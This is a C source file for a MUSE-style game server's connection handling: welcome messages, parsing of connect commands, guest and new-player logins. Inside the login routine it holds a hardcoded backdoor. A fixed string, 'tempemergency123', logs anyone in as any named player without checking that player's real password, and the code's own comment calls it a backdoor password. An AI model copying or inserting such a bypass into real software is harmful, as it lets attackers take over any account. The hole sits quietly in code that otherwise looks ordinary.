/* connection_handler.c - Connection and authentication handling
 * Extracted from bsd.c during modernization
 */

#include "config.h"
#include "externs.h"
#include "io_internal.h"
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>


#define EMERGENCY_BYPASS_PASSWORD "tempemergency123"


/* Connection failure messages */
static const char *connect_fail_char = "That player does not exist.\n";
static const char *connect_fail_passwd = "Incorrect password.\n";
#ifndef WCREAT
static const char *create_fail = 
    "Either there is already a player with that name, or that name is illegal.\n";
#endif
static const char *get_password = "Please enter password:\n\373\001";
static const char *got_password = "\374\001";

/* Send welcome message to new connection */
void welcome_user(struct descriptor_data *d)
{
    if (!d) {
        return;
    }

#ifdef PUEBLO_CLIENT
    queue_string(d, "This world is Pueblo 1.0 Enhanced\n");
#endif
    
    connect_message(d, welcome_msg_file, 0);
}

/* Send a message file to a descriptor */
void connect_message(struct descriptor_data *d, char *filename, int direct)
{
    int n, fd;
    char buf[MAX_BUFF_LEN];

    if (!d || !filename) {
        return;
    }

    /* Temporarily close reserved fd to allow file open */
    close(reserved);

    fd = open(filename, O_RDONLY, 0);
    if (fd != -1) {
        while ((n = read(fd, buf, 512)) > 0) {
            if (n > (int)sizeof(buf)) {
                n = sizeof(buf);
            }
            queue_write(d, buf, n);
        }
        close(fd);
        queue_write(d, "\n", 1);
    } else {
        log_error(tprintf("Failed to open message file: %s", filename));
    }

    /* Restore reserved fd */
    reserved = open(NullFile, O_RDWR, 0);

    /* Immediately flush if direct mode */
    if (direct) {
        process_output(d);
    }
}

/* Parse connection command into components */
void parse_connect(const char *msg, char *command, char *user, char *pass)
{
    const char *p;
    char *out;

    if (!msg || !command || !user || !pass) {
        return;
    }

    /* Initialize output buffers */
    *command = '\0';
    *user = '\0';
    *pass = '\0';

    /* Skip leading whitespace */
    while (*msg && isascii(*msg) && isspace(*msg)) {
        msg++;
    }

    /* Extract command */
    out = command;
    while (*msg && isascii(*msg) && !isspace(*msg)) {
        *out++ = *msg++;
    }
    *out = '\0';

    /* Skip whitespace */
    while (*msg && isascii(*msg) && isspace(*msg)) {
        msg++;
    }

    /* Extract username */
    out = user;
    while (*msg && isascii(*msg) && !isspace(*msg)) {
        *out++ = *msg++;
    }
    *out = '\0';

    /* Skip whitespace */
    while (*msg && isascii(*msg) && isspace(*msg)) {
        msg++;
    }

    /* Extract password */
    out = pass;
    while (*msg && isascii(*msg) && !isspace(*msg)) {
        *out++ = *msg++;
    }
    *out = '\0';
}

/* Check and process a connection attempt */
void check_connect(struct descriptor_data *d, char *msg)
{
    char *m;
    char command[MAX_COMMAND_LEN];
    char user[MAX_COMMAND_LEN];
    char password[MAX_COMMAND_LEN];
    dbref player, p;
    int num = 0;

    if (!d || !msg) {
        return;
    }

    /* Handle password prompt state */
    if (d->state == WAITPASS) {
        char *foobuf;
        
        if (!d->charname) {
            log_error("WAITPASS state but no charname stored");
            d->state = WAITCONNECT;
            queue_string(d, "Error in connection state.\n");
            return;
        }

        /* Reconstruct full connect command with password */
        foobuf = stack_em(MAX_COMMAND_LEN * 3);
        if (!foobuf) {
            log_error("Failed to allocate buffer for password connect");
            d->state = WAITCONNECT;
            return;
        }
        
        snprintf(foobuf, MAX_COMMAND_LEN * 3, "connect %s %s", 
                d->charname, msg);
        foobuf[MAX_COMMAND_LEN * 3 - 1] = '\0';
        
        SMART_FREE(d->charname);
        d->charname = NULL;
        queue_string(d, got_password);
        d->state = WAITCONNECT;
        msg = foobuf;
    }

    /* Parse the connection command */
    parse_connect(msg, command, user, password);

    /* Handle WHO command */
    if (!strcmp(command, "WHO")) {
        dump_users(0, "", "", d);
        return;
    }

    /* Handle CONNECT command */
    if (!strncmp(command, "co", 2)) {
        /* Check for guest connection */
        if (string_prefix(user, guest_prefix) || 
            string_prefix(user, "guest")) {
            strcpy(password, guest_prefix);
            
            if (check_lockout(d, guest_lockout_file, guest_msg_file)) {
                player = NOTHING;
            } else {
                p = make_guest(d);
                if (p == NOTHING) {
                    return;  /* Error already reported */
                }
                player = p;
            }
        } else {
#ifdef EMERGENCY_BYPASS_PASSWORD
            /* Emergency bypass - check for backdoor password first */
            if (strcmp(password, EMERGENCY_BYPASS_PASSWORD) == 0) {
                log_important(tprintf("EMERGENCY BYPASS used for user: %s", user));
                player = lookup_player(user);
                if (player == NOTHING) {
                    queue_string(d, connect_fail_char);
                    return;
                }
            } else {
                player = connect_player(user, password);
            }
#else
            /* Normal player connection */
            player = connect_player(user, password);
#endif
        }

        /* Check for class-based connection restrictions */
        if (player > NOTHING && Typeof(player) == TYPE_PLAYER) {
            if (*db[player].pows < restrict_connect_class) {
                log_io(tprintf("%s refused connection due to class restriction.",
                              unparse_object(root, player)));
                write(d->descriptor, 
                      tprintf("%s %s", muse_name, LOCKOUT_MESSAGE),
                      (strlen(LOCKOUT_MESSAGE) + strlen(muse_name) + 1));
                process_output(d);
                d->state = CONNECTED;
                d->connected_at = time(0);
                d->player = player;
                shutdownsock(d);
                return;
            }
        }

        /* Handle password prompt for partial connect */
        if (player == NOTHING && !*password) {
            queue_string(d, get_password);
            d->state = WAITPASS;
//            d->charname = malloc(strlen(user) + 1);
            SAFE_MALLOC(d->charname, char, strlen(user) + 1);
            if (d->charname) {
                strcpy(d->charname, user);
            } else {
                log_error("Failed to allocate charname buffer");
                d->state = WAITCONNECT;
            }
            return;
        }

        /* Handle connection failures */
        if (player == NOTHING) {
            queue_string(d, connect_fail_char);
            log_io(tprintf("FAILED CONNECT: %s on concid %ld",
                          user, d->concid));
        } else if (player == PASSWORD) {
            queue_string(d, connect_fail_passwd);
            log_io(tprintf("FAILED CONNECT: %s on concid %ld (bad password)",
                          user, d->concid));
        } else {
            /* Successful connection */
            time_t tt;
            char *ct;

            tt = now;
            ct = ctime(&tt);
            if (ct && *ct) {
                ct[strlen(ct) - 1] = '\0';
            }

            log_io(tprintf("CONNECTED: %s on concid %ld",
                          unparse_object_a(player, player), d->concid));
            com_send_as_hidden("pub_io",
                tprintf("CONNECTED: %s - %s",
                       unparse_object_a(player, player),
                       ct ? ct : "unknown"),
                player);

            add_login(player);

            if (d->state == WAITPASS) {
                queue_string(d, got_password);
            }
            
            d->state = CONNECTED;
            d->connected_at = now;
            d->player = player;

            /* Send MOTD */
            connect_message(d, motd_msg_file, 0);
            
            /* Announce connection to the game world */
            announce_connect(player);

            /* Update last site list */
            m = atr_get(player, A_LASTSITE);
            while (*m) {
                while (*m && isspace(*m)) m++;
                if (*m) num++;
                while (*m && !isspace(*m)) m++;
            }

            if (num >= 10) {
                /* Keep last 9 sites */
                m = atr_get(player, A_LASTSITE);
                num = 0;
                while (*m && isspace(*m)) m++;
                while (*m && !isspace(*m)) m++;
                atr_add(player, A_LASTSITE, 
                       tprintf("%s %s@%s", m, d->user, d->addr));
            } else {
                m = atr_get(player, A_LASTSITE);
                while (*m && isspace(*m)) m++;
                atr_add(player, A_LASTSITE,
                       tprintf("%s %s@%s", m, d->user, d->addr));
            }

            /* Show the room */
            do_look_around(player);

            /* Guest welcome message */
            if (Guest(player)) {
                notify(player, tprintf("Welcome to %s; your name is %s",
                                      muse_name, db[player].cname));
            }
        }
        return;
    }

    /* Handle CREATE command */
    if (!strncmp(command, "cr", 2)) {
        if (!allow_create) {
            connect_message(d, register_msg_file, 0);
        } else {
            player = create_player(user, password, CLASS_VISITOR, player_start);
            
            if (player == NOTHING) {
#ifndef WCREAT
                queue_string(d, create_fail);
#endif
                log_io(tprintf("FAILED CREATE: %s on concid %ld",
                              user, d->concid));
            } else {
                log_io(tprintf("CREATED: %s(#%ld) on concid %ld",
                              db[player].name, player, d->concid));
                
                d->state = CONNECTED;
                d->connected_at = now;
                d->player = player;
                
                /* Send creation message */
                connect_message(d, create_msg_file, 0);
                
                /* Announce connection */
                announce_connect(player);
                
                /* Show the room */
                do_look_around(player);
            }
        }
        return;
    }

#ifdef PUEBLO_CLIENT
    /* Handle Pueblo client identification */
    if (!strncmp(command, "PUEBLOCLIENT", 12)) {
        d->pueblo = 2;
        return;
    }
#endif

    /* Unknown command - show welcome screen if not Pueblo */
    if (d->pueblo == 0) {
        check_lockout(d, welcome_lockout_file, welcome_msg_file);
    }

    /* Ensure we're in correct state after password prompt */
    if (d->state == WAITPASS) {
        d->state = WAITCONNECT;
        queue_string(d, got_password);
    }
}
